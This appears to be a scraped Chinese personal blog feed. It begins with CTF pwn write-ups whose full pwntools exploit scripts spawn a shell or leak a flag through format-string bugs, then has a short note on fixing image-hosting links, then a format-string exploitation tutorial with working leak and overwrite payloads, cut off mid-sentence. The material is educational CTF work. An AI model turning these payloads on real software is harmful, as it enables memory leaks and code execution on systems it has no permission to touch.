<span class="hljs-type">ENABLED</span>PIE       : <span class="hljs-type">disabled</span>RELRO     : <span class="hljs-type">Partial</span></code></pre></div><h3 id="ida分析-9"><a href="#ida分析-9" class="headerlink" title="ida分析"></a>ida分析</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">char</span> *__<span class="hljs-function">cdecl <span class="hljs-title">sub_80485C4</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *s)</span></span>&#123;  <span class="hljs-keyword">char</span> *v1; <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">char</span> *result; <span class="hljs-comment">// eax</span>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"..."</span>);  v1 = strtok(s, <span class="hljs-string">"|"</span>);  <span class="hljs-built_in">printf</span>(v1);  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )  &#123;    result = strtok(<span class="hljs-number">0</span>, <span class="hljs-string">"|"</span>);    <span class="hljs-keyword">if</span> ( !result )      <span class="hljs-keyword">break</span>;    <span class="hljs-built_in">printf</span>(result);  &#125;  <span class="hljs-keyword">return</span> result;&#125;</code></pre></div><p>这里因为用strtok做处理，只有一次的传送机会，payload需要用<code>|</code>    分割格式化字符串来完成每次的printf的漏洞利用，稍微麻烦了一下。<br>并且存在后门函数：</p><div class="hljs"><pre><code class="hljs undefined">.text:<span class="hljs-number">080485AB</span>                 <span class="hljs-built_in">push</span>    ebp.text:<span class="hljs-number">080485AC</span>                 mov     ebp, esp.text:<span class="hljs-number">080485AE</span>                 sub     esp, <span class="hljs-number">8</span>.text:<span class="hljs-number">080485B1</span> ; <span class="hljs-number">3</span>:   <span class="hljs-built_in">return</span> <span class="hljs-built_in">system</span>(<span class="hljs-string">"/bin/sh"</span>);.text:<span class="hljs-number">080485B1</span>                 sub     esp, <span class="hljs-number">0Ch</span>.text:<span class="hljs-number">080485B4</span>                 <span class="hljs-built_in">push</span>    offset command  ; <span class="hljs-string">"/bin/sh"</span>.text:<span class="hljs-number">080485B9</span>                 call    _system.text:<span class="hljs-number">080485BE</span>                 add     esp, 10h.text:<span class="hljs-number">080485C1</span>                 nop.text:<span class="hljs-number">080485C2</span>                 leave.text:<span class="hljs-number">080485C3</span>                 retn</code></pre></div><p>这下可以直接改ret address即可。</p><h3 id="gdb分析-3"><a href="#gdb分析-3" class="headerlink" title="gdb分析"></a>gdb分析</h3><p>先观察一下ebp链是否存在 ：<br><img src="http://qiqianyun.chumen77.xyz/uPic/8H01Yk.png" srcset="/img/loading.gif" alt><br>是存在的，然后直接利用就好了。<br><img src="http://qiqianyun.chumen77.xyz/uPic/e2PTss.png" srcset="/img/loading.gif" alt><br>看一下，在第一次改ebp2里面的值： 0xffffd338 时，发现下面的第二个只需要改一个字节即可，然后目标就是改成这个栈地址了：<br><img src="http://qiqianyun.chumen77.xyz/uPic/cYhR45.png" srcset="/img/loading.gif" alt><br>然后接着利用漏洞，改一下返回地址到后门函数即可。</p><p>（这个题自己在做的时候，先是试着利用第二个的0xffffd2f8 ，这个链发现本地可以打通，远程是不行的，这就是环境因素了，远程由于libc版本的不同，栈结构也是不同的。所以做题还是优先，考虑ebp链，然后没法利用了，在考虑充分利用栈数据，这个通常也是出题人精心设计的栈结构，让你有数据可以利用。）</p><h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'i386'</span>system_addr = <span class="hljs-number">0x080485B4</span>tag1 = <span class="hljs-number">0x4c</span>tag2 = <span class="hljs-number">0x85ab</span>io = process(<span class="hljs-string">'./xman_2019_format'</span>)<span class="hljs-comment"># io = remote('node3.buuoj.cn',27012)</span>payload = <span class="hljs-string">'%&#123;&#125;c%10$hhn|'</span>.format(<span class="hljs-number">0x4c</span>)payload += <span class="hljs-string">'%&#123;&#125;c%18$hn~'</span>.format(<span class="hljs-number">0x85ab</span>)<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<span class="hljs-keyword">try</span>:io.recvuntil(<span class="hljs-string">'...\n...\n'</span>)io.sendline(payload)sleep(<span class="hljs-number">0.1</span>)io.recvuntil(<span class="hljs-string">'~'</span>)io.sendline(<span class="hljs-string">'ls'</span>)io.recvline()io.recvline()io.interactive()<span class="hljs-keyword">break</span><span class="hljs-keyword">except</span> EOFError :io.close()io = process(<span class="hljs-string">'./xman_2019_format'</span>)<span class="hljs-comment"># io = remote('node3.buuoj.cn',27012)</span></code></pre></div><p>需要爆破栈。</p><h2 id="suctf-2019-playfmt"><a href="#suctf-2019-playfmt" class="headerlink" title="suctf-2019-playfmt"></a>suctf-2019-playfmt</h2><h3 id="保护和arch-8"><a href="#保护和arch-8" class="headerlink" title="保护和arch"></a>保护和arch</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Full</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span></code></pre></div><p>开启了RELRO，这样就无法got hijack了</p><h3 id="ida分析-10"><a href="#ida分析-10" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/ycZIc7.png" srcset="/img/loading.gif" alt></p><h3 id="gdb分析-4"><a href="#gdb分析-4" class="headerlink" title="gdb分析"></a>gdb分析</h3><p>程序先读入了flag文件，自己可以写一个flag文件测试，并且gdb跟随：<br><img src="http://qiqianyun.chumen77.xyz/uPic/TqMvc5.png" srcset="/img/loading.gif" alt><br>其会被读到堆上。紧接着跟到格式化字符串漏洞处：<br><img src="http://qiqianyun.chumen77.xyz/uPic/DqFQFq.png" srcset="/img/loading.gif" alt><br>看一下这个堆地址是否被程序操作修改了：</p><div class="hljs"><pre><code class="hljs undefined">gdb-peda$ x/s <span class="hljs-number">0x8050b70</span><span class="hljs-number">0x8050b70</span>:"flag&#123;f9255a80-e<span class="hljs-number">059-4c12</span>-<span class="hljs-number">8788</span>-<span class="hljs-number">161</span>bf8c6908b&#125;"</code></pre></div><p>发现并没有，那就很简单了。攻击思路就是，在栈上构造出这个存放flag的堆地址（计算方式就是在此时的栈上找一个地址来计算偏移获取）。<br>第一步：<br><img src="http://qiqianyun.chumen77.xyz/uPic/kOCpje.png" srcset="/img/loading.gif" alt><br>先修改ebp2上存放的值，改成后面那个框框对应的栈地址，然后在做处理：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0024</span>| <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">xffffd318</span> --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">xffffd338</span> --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">xffffd348</span> --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x8050ba0</span> --&gt;</span> <span class="hljs-number">0</span>x0</code></pre></div><p>此时再修改ebp1上的值，改成刚刚的堆地址 ：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/0sJJGL.png" srcset="/img/loading.gif" alt><br>这样exp写的时候，找好偏移%s一下就出来了。</p><h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'i386'</span><span class="hljs-comment"># io = remote('node3.buuoj.cn',27816)</span>io = process(<span class="hljs-string">'./1'</span>)io.recvuntil(<span class="hljs-string">'Magic echo Server'</span>)io.recvuntil(<span class="hljs-string">'=====================\n'</span>)io.sendline(<span class="hljs-string">'%18$p'</span>)io.recvuntil(<span class="hljs-string">'0x'</span>)flag = int(io.recv(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>)print(hex(flag))key = int((hex(flag))[<span class="hljs-number">-4</span>:],<span class="hljs-number">16</span>) - <span class="hljs-number">32</span> <span class="hljs-number">-12</span> <span class="hljs-number">-4</span>print(<span class="hljs-string">'key'</span>+ hex(key))<span class="hljs-comment"># raw_input('-&gt;')</span>io.sendline(<span class="hljs-string">'%6$p'</span>)io.recvuntil(<span class="hljs-string">'0x'</span>)stack_point = int(io.recv(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>) + <span class="hljs-number">16</span>tag1 = int((hex(stack_point))[<span class="hljs-number">-2</span>:],<span class="hljs-number">16</span>)print(hex(tag1))payload  = <span class="hljs-string">'%'</span> + str(tag1) + <span class="hljs-string">'c%6$hhn'</span> + <span class="hljs-string">'1'</span>raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.recvuntil(<span class="hljs-string">'1'</span>)payload = <span class="hljs-string">'%'</span> +  str(key &amp; <span class="hljs-number">0xffff</span>) + <span class="hljs-string">'c%14$hn'</span> + <span class="hljs-string">'2'</span>raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.recvuntil(<span class="hljs-string">'2'</span>)io.sendline(<span class="hljs-string">'%18$s'</span>)io.interactive()</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>学习记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>修复七千云外链失效</title>
    <link href="/2020/03/12/%E4%BF%AE%E5%A4%8D%E4%B8%83%E5%8D%83%E4%BA%91%E5%A4%96%E9%93%BE%E5%A4%B1%E6%95%88/"/>
    <url>/2020/03/12/%E4%BF%AE%E5%A4%8D%E4%B8%83%E5%8D%83%E4%BA%91%E5%A4%96%E9%93%BE%E5%A4%B1%E6%95%88/</url>
    
    <content type="html"><![CDATA[<h1 id="修复七千云外链失效"><a href="#修复七千云外链失效" class="headerlink" title="修复七千云外链失效"></a>修复七千云外链失效</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>自己的以前申请过一个七千云做自己的图床，今晚写博客发现，自己上传不上图片，并且用upic导出来的链接无法显示图片了。查了很久的原因，发现是七千牛原来给我分配的免费外链域名给我断用了。<br><img src="http://qiqianyun.chumen77.xyz/uPic/78YdoJ.png" srcset="/img/loading.gif" alt><br>就是这个没了，自己排错，排了半天才发现。是在这里找到的，好隐蔽。。。<br><img src="http://qiqianyun.chumen77.xyz/uPic/aeXsve.png" srcset="/img/loading.gif" alt><br>然后就在文件管理那里发现，网站提示说如果无法显示图片，加载慢，可以加一个域名。然后我就尝试加了一个，然后就修复好了。</p><h2 id="修复过程"><a href="#修复过程" class="headerlink" title="修复过程"></a>修复过程</h2><h3 id="绑定创建域名"><a href="#绑定创建域名" class="headerlink" title="绑定创建域名"></a>绑定创建域名</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/XxkzAY.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/sW0Ju4.png" srcset="/img/loading.gif" alt><br>xxxx也就是填你的域名，前面的可以自定义。点击添加后下面总是会自动又弹出一个空白的框，点击后面的删除，否则，往下滑你会发现就是创建不了这个记录。<br>创建成功后，会提示你复制<strong>CNAME</strong>，复制一下，去往你自己的域名网站，我用的是阿里云。</p><h3 id="去自己的dns解析平台"><a href="#去自己的dns解析平台" class="headerlink" title="去自己的dns解析平台"></a>去自己的dns解析平台</h3><p>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/meWpeP.png" srcset="/img/loading.gif" alt><br>这里的主机记录填入刚刚你自定义的主机开头，记录值填入刚刚复制的CNAME，就可以了。</p><h3 id="修改upic设置"><a href="#修改upic设置" class="headerlink" title="修改upic设置"></a>修改upic设置</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/adszoz.png" srcset="/img/loading.gif" alt><br>填入即可，以前写的博客，图片的链接也要改一下，就恢复原来的样子了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>杂项</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>格式化字符串漏洞小总结（上）</title>
    <link href="/2020/03/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%B0%8F%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <url>/2020/03/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%B0%8F%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="格式化字符串漏洞小总结（上）"><a href="#格式化字符串漏洞小总结（上）" class="headerlink" title="格式化字符串漏洞小总结（上）"></a>格式化字符串漏洞小总结（上）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录一下，在学习这个漏洞时候的自己感觉的疑难点，和做题时候的一点小技巧，这一篇主要是记录理论。</p><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><p>基本格式：</p><div class="hljs"><pre><code class="hljs c">%[parameter][flags][field width][.precision][length]type</code></pre></div><p>需要重点关注的pattern：</p><ol><li>parameter ：n$，获取格式化字符串中的指定参数</li><li>field width ：输出的最小宽度</li><li>precision ：输出的最大长度</li><li>length，输出的长度 : <code>hh，1-byte ； h，2-byte ； l, 4-byte ；ll,8-byte ；</code></li><li>type :<div class="hljs"><pre><code class="hljs c">d/i，有符号整数u，无符号整数x/X，<span class="hljs-number">16</span> 进制 <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> 。x 使用小写字母；X 使用大写字母.s，输出以null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。c，把 <span class="hljs-keyword">int</span> 参数转为 <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> 型输出p， <span class="hljs-keyword">void</span> * 型，输出对应变量的值。<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%p"</span>,a) 用地址的格式打印变量 a 的值，<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%p"</span>, &amp;a) 打印变量 a 所在的地址。n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。（仅仅是在这一个<span class="hljs-built_in">printf</span>的函数）%， <span class="hljs-string">'%'</span>字面值，不接受任何 flags, width。</code></pre></div></li></ol><p>参数：就是是要对应输出的变量。</p><h2 id="格式化字符串漏洞原理"><a href="#格式化字符串漏洞原理" class="headerlink" title="格式化字符串漏洞原理"></a>格式化字符串漏洞原理</h2><p>格式化字符串函数是根据格式化字符串函数来进行解析的。那么相应的要被解析的参数的个数也自然是由这个<strong>格式化字符串</strong>所控制。<br><img src="http://qiqianyun.chumen77.xyz/uPic/PnScRI.png" srcset="/img/loading.gif" alt></p><p>根据 <strong>cdecl 的调用约定</strong>,在进入 printf()  函数之前,将参数从右到左依次压栈。进入printf()  之后,函数首先获取第一个参数,一次读取一个字符。如果字符不是    % ,字符直接复制到输出中。否则,读取下一个非空字符,获取相应的参数并解析输出。<br>如上图一样，格式化字符串的参数与后面实际提供的是一一对应的，就不会出现什么问题，但如果在格式化字符串多加几个格式化字符的时候，程序会怎么办呢？<strong>此时其可以正常通过编译，并且在栈上取值，按照给的格式化字符来解析对应栈上的值。此时也就发生了格式化字符串漏洞。</strong></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="泄露内存数据"><a href="#泄露内存数据" class="headerlink" title="泄露内存数据"></a>泄露内存数据</h3><h4 id="栈上的数据"><a href="#栈上的数据" class="headerlink" title="栈上的数据"></a>栈上的数据</h4><ol><li>利用 % order $ p / % order x 来获取指定参数对应栈的内存值 。(常用%p)</li><li>利用 % order $ s 来获取指定变量所对应地址的内容，只不过有零截断。(这个在做某些ctf题很好用，当一个程序上来读取一个flag到一个位置，然后你在栈上构造这个位置，直接%s就出来flag了。)<h4 id="任意地址内存"><a href="#任意地址内存" class="headerlink" title="任意地址内存"></a>任意地址内存</h4>当想泄露任意地址内存的时候，就需要<strong>想办法把地址写入栈中</strong>。<br>在一般情况下，格式化字符串也是存在栈上的，当可控的时候，就可以直接把某个地址写到这个格式化字符串上，然后找下在这个printf函数中<strong>对应的栈偏移</strong>，然后在用你想用的格式化字符（%p/%x/%s）来操作即可。然后在这个地方，其有个难点就是<strong>找对应的栈偏移</strong>。在我们实际用的时候，其实就是找栈上的某个位置对应这个格式化字符串的偏移，并且也分为32位于64位，因为其传参是不一样的。<h5 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h5><h6 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h6></li></ol><p><img src="http://qiqianyun.chumen77.xyz/uPic/jYXCSU.png" srcset="/img/loading.gif" alt><br>这是32位的栈对应情况，是比较好理解的。如图，并且发现这些指定参数的（如%4$x),其就是对应找对应栈上内容 ，而不指定的%x其找寻找的时候，是看下前面有个几个对应的无指定格式化字符，就想图上的情况，再给一个%x其是会找到arg4。</p><h6 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h6><p>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/KzxXZK.png" srcset="/img/loading.gif" alt><br>因为64位的参数存放是优先寄存器(rdi,rsi,rdx,rcx,r8,r9)，占满以后第7个参数才会存放在栈上。这就是跟32位找偏移不同地方。</p><h6 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h6><p>可以给gdb安装一下pwndbg，在GitHub上面找的到。然后演示一下：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;        setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);        <span class="hljs-keyword">char</span> buf[<span class="hljs-number">100</span>];        read(<span class="hljs-number">0</span>,buf,<span class="hljs-number">99</span>);        <span class="hljs-built_in">printf</span>(buf);&#125;</code></pre></div><p>gdb调试，找图中框框的栈地址，对应的偏移：<br>32位：<br><img src="http://qiqianyun.chumen77.xyz/uPic/MCYXvC.png" srcset="/img/loading.gif" alt><br>64位：<br><img src="http://qiqianyun.chumen77.xyz/uPic/M6uXrw.png" srcset="/img/loading.gif" alt></p><p>注意是对应格式化字符串的偏移。用pwndbg的fmtarg确定偏移，就不用担心数错了。</p><h5 id="写地址进栈"><a href="#写地址进栈" class="headerlink" title="写地址进栈"></a>写地址进栈</h5><p>学会确定偏移后，就可以写地址进栈，来实现读任意地址内存了。经常使用的是，<strong>把这个程序中的某个got地址写进栈，然后就可以了来获取其内容，然后在根据其在libc中的偏移就可以计算出libc的基址，进而算出任意一个函数的地址（如system）</strong>。</p><h6 id="32位："><a href="#32位：" class="headerlink" title="32位："></a>32位：</h6><p>格式：<code>&lt;address&gt;%&lt;order&gt;$s</code><br>这样就可以尝试读出，adress处对应的值，但是因为是%s，其遇到\x00就会直接断了，没有想要的输出。更常有的情况就是，会输出一大堆，然后我们想要的地址掺杂在里面，所以可以改进一下，可以加一组标记，然后再去取出来想要，这样也可以来检测是否被\x00截断了。<br>改进格式：<code>&lt;address&gt;@@%&lt;order&gt;$s@@</code><br>在使用的时候记得除去 <strong>&lt; &gt;</strong>。<br>实例：</p><div class="hljs"><pre><code class="hljs c">gdb-peda$ got/media/psf/mypwn2/HITCON-Training-master/LAB/lab7/test:     file format elf32-i386DYNAMIC RELOCATION RECORDSOFFSET   TYPE              VALUE<span class="hljs-number">08049f</span>fc R_386_GLOB_DAT    __gmon_start__<span class="hljs-number">0804</span>a028 R_386_COPY        <span class="hljs-built_in">stdout</span>@@GLIBC_2<span class="hljs-number">.0</span><span class="hljs-number">0804</span>a00c R_386_JUMP_SLOT   read@GLIBC_2<span class="hljs-number">.0</span><span class="hljs-number">0804</span>a010 R_386_JUMP_SLOT   <span class="hljs-built_in">printf</span>@GLIBC_2<span class="hljs-number">.0</span><span class="hljs-number">0804</span>a014 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2<span class="hljs-number">.4</span><span class="hljs-number">0804</span>a018 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2<span class="hljs-number">.0</span><span class="hljs-number">0804</span>a01c R_386_JUMP_SLOT   setvbuf@GLIBC_2<span class="hljs-number">.0</span></code></pre></div><p>获取一下got，选择read ： 0x0804a00c ,然后借助pwntools：</p><div class="hljs"><pre><code class="hljs c">from pwn import *context.log_level = 'debug'io = process('./test')payload = p32(0x0804a00c) + '@@%6$s@@'# raw_input('-&gt;')io.sendline(payload)io.recvuntil('@@')print('leak-&gt;' +hex(u32(io.recv(4))))io.interactive()</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/BP69HU.png" srcset="/img/loading.gif" alt><br>发现出现了异常。<br>修改代码，查一下read在libc的symbols：</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>io = process(<span class="hljs-string">'./test'</span>)elf = ELF(<span class="hljs-string">'./test'</span>)libc = elf.libcpayload = p32(<span class="hljs-number">0x0804a00c</span>) + <span class="hljs-string">'@@%6$s@@'</span><span class="hljs-comment"># raw_input('-&gt;')</span>io.sendline(payload)io.recvuntil(<span class="hljs-string">'@@'</span>)print(<span class="hljs-string">'leak-&gt;'</span> +hex(u32(io.recv(<span class="hljs-number">4</span>))))print(<span class="hljs-string">'read-libc.symbols-&gt;'</span> + hex(libc.symbols[<span class="hljs-string">'read'</span>]))io.interactive()</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/B6kI8x.png" srcset="/img/loading.gif" alt><br>发现就是因为运气不好，这个libc版本里正好read函数是00结尾的，所以换一下:<br>Printf : 0x0804a010<br><img src="http://qiqianyun.chumen77.xyz/uPic/HwQRgy.png" srcset="/img/loading.gif" alt><br>这就可以了，并且还可以看出来的确是输出来一堆东西。</p><h6 id="64位-1"><a href="#64位-1" class="headerlink" title="64位"></a>64位</h6><p>在64位程序当中，一个地址的高位必定就是0，所以<strong>address是不能写到格式化字符串的最前面的</strong>，可以跟在fmt后面，但是这里就牵涉到了字节对齐问题，并且其偏移量算起来，当格式化字符串不做padding时，偏移量时会因为格式化字符串的长度而发生变化的。所以较好的做法，<strong>就是在格式化字符串处做好padding，这样解决了字节对齐，也解决了偏移量的计算。</strong><br>实例：（还是刚刚的程序编译成64位）</p><div class="hljs"><pre><code class="hljs python">payload = <span class="hljs-string">'@@%6$s@@'</span>.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">'a'</span>) + p64(<span class="hljs-number">0x000000601020</span>)</code></pre></div><p>这次把payload这样写，做好padding，把address写在后面，此时因为偏移会变，gdb调试一下看看，偏移变为多少：<br><img src="http://qiqianyun.chumen77.xyz/uPic/t6RmMP.png" srcset="/img/loading.gif" alt><br>可以看出来偏移为11。<br><img src="http://qiqianyun.chumen77.xyz/uPic/03RQ1J.png" srcset="/img/loading.gif" alt><br>发现再次运气不好，还是得换一个函数打印got，换成read：</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>io = process(<span class="hljs-string">'./test3'</span>)elf = ELF(<span class="hljs-string">'./test3'</span>)libc = elf.libcpayload = <span class="hljs-string">'@@%11$s@@'</span>.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">'a'</span>) + p64(<span class="hljs-number">0x000000601028</span>)raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.recvuntil(<span class="hljs-string">'@@'</span>)print(<span class="hljs-string">'leak-&gt;'</span> +hex(u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))))print(<span class="hljs-string">'read-libc.symbols-&gt;'</span> + hex(libc.symbols[<span class="hljs-string">'read'</span>]))io.interactive()</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/mH8zy0.png" srcset="/img/loading.gif" alt><br>这样就OK了。</p><h5 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h5><ol><li>使用%s 读取内存里的任意位址，%s 会把对应的参数当做 <code>char*</code>指标并将目标做为字符串印出来</li><li>使用限制:Stack 上要有可控制 addres 的buffer ;注意由于是当做字符串打印，所以到 0 时就会中断,也要注意32位跟64位address的写在的位置。<h5 id="小技巧-1"><a href="#小技巧-1" class="headerlink" title="小技巧"></a>小技巧</h5><h6 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h6>想要泄露libc基址，还有就是通过返回<code>__libc_start_main + x</code>(libc版本不一样可能会不一样，本人是ubuntu16.04)<br><img src="http://qiqianyun.chumen77.xyz/uPic/IFdTkV.png" srcset="/img/loading.gif" alt><br>算一下偏移是21。<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>io = process(<span class="hljs-string">'./test3'</span>)elf = ELF(<span class="hljs-string">'./test3'</span>)libc = elf.libcpayload = <span class="hljs-string">'%21$p'</span>.ljust(<span class="hljs-number">0x8</span>,<span class="hljs-string">'a'</span>)raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.recvuntil(<span class="hljs-string">'0x'</span>)libc_base = int(io.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">240</span> - libc.symbols[<span class="hljs-string">'__libc_start_main'</span>]print(<span class="hljs-string">'leak-&gt;'</span> +hex(libc_base))io.interactive()</code></pre></div></li></ol><p>运行这个exp来leak libc的基址：<br><img src="http://qiqianyun.chumen77.xyz/uPic/MsG4Nl.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/R9cYuX.png" srcset="/img/loading.gif" alt><br>成功了。</p><h6 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h6><p>泄露stack address ：<br><img src="http://qiqianyun.chumen77.xyz/uPic/rBKqdw.png" srcset="/img/loading.gif" alt><br>正如图中所示，会发现栈上说有很多与esp接近的数据，利用合适的数据根据偏移就会拿到esp的值，然后就得到了satck address。常用的也就是多层函数调用时，留下的ebp值。</p><h3 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h3><p>覆盖内存通常其实就是改写内存，其中分为<strong>改写栈上的内存和任意地址的内存</strong>，从而来控制程序的执行流程。（这里我先只记录一下任意地址的覆盖，改写栈上的内存暂时用不到）<br>这里面主要是使用<code>%n</code>, %n  转换指示符不输出字符，将 当前printf函数已经成功写入流或缓冲区中的字符个数写入对应的整型指针参数所指的变量。其核心就是：<strong>写入的值 = 已经输出的字符数</strong> ，知道这个以后，其<strong>使用起来就是控制好在这次%n前输出正确的字符数</strong>。</p><h4 id="任意地址覆盖"><a href="#任意地址覆盖" class="headerlink" title="任意地址覆盖"></a>任意地址覆盖</h4><ul><li>使用方法类似于%s的任意地址读取，只是换成了%n。</li><li>使用%xc的办法来控制输出的字符数。<br>基本格式： <code>....[overwrite addr]....%[overwrite offset]$n</code><br>其中<code>....</code> 表示我们的填充内容，<code>overwrite addr</code> 表示我们所要覆盖的地址，<code>overwrite offset</code> 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数。也就是构造一个需要写入的address，然后用%xxc来控制写入的字符数，然后把握好偏移。</li></ul><h5 id="fmt字符串写入大小"><a href="#fmt字符串写入大小" class="headerlink" title="fmt字符串写入大小"></a>fmt字符串写入大小</h5><p>因为%n在一次的写入是在一次当中写入int大小的整数，当使用%xc来控制输出一个int大小的字符个数，这个printf函数会输出十分大的字符数量，这个结果对我们说十分不利的，一方面远端程序输出以后，自己接收是一个问题，是十分不稳定的，并且无法精准的控制需要修改的地方。<br>所以常用的是%hn 和%hhn，分别写入short和char大小的整数，然后分成多次写入以组合成完整的int整数，这个过程是十分稳定的。</p><h5 id="单次printf多次写入"><a href="#单次printf多次写入" class="headerlink" title="单次printf多次写入"></a>单次printf多次写入</h5><p>在进行GOT hijack或者改掉某一个指标的时候，通常会要求一次printf内就要来改写完成，不然改一半的值这个指标再被使用时程序很容易崩溃。<br>所以就可以把多个格式化字符串结合在一次，例如：</p><div class="hljs"><pre><code class="hljs python">%xc%offset1$hn %yc%offset2$hn address address+<span class="hljs-number">2</span></code></pre></div><p>但这样就说需要小心偏移，并且输出的字符数也要控制好。难点也在控制这个多次写入时，c前面应该填多少的值。</p><h5 id="多次写入时控制输出的字符数"><a href="#多次写入时控制输出的字符数" class="headerlink" title="多次写入时控制输出的字符数"></a>多次写入时控制输出的字符数</h5><p>要注意的是<strong>%n写入的值是其前面输出的字符数。</strong></p><ol><li><p>第一次%xc%hhn的时候，要扣掉前面摆放的address的长度。比如32位时，其前面会摆放4个地址，这个时候就是x需要减去4x4 = 16.</p></li><li><p>之后每个%xc 必需扣掉前一个写入 byte 的值总字符数才会是这个写入需要的长度。比如 第一次写入值为 90 第二个写入 120 此时应为<code>%30c% 